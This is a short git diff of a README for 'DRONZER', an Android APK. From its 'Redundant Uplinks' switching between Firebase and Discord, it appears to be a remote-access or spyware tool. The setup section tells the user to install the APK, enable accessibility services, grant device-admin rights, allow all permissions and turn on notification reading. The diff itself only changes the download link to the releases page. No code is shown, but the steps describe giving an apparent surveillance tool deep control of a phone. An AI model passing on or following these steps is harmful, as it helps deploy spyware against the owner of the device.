@@ -112,7 +112,7 @@ Redundant Uplinks: Automatically switches between Firebase and Discord if one en
 </details>
 
 # **SETUP GUIDE**
-* Download latest apk version from [here](https://github.com/VintageAyu/DRONZER/releases/download/v6.0.0.7/DRONZER.apk).
+* Download latest apk version from [here](https://github.com/VintageAyu/DRONZER/releases).
 * Open the apk and it will redirect you to accessibility services, toggle it on. (always cross-check because it may show not working - in this case toggle off and on again)
 * Go back and it will ask you for device admin perms, allow it and it will ask you for permissions allow all, follow the steps
 * It will redirect you to read notification settings and all , go through it.
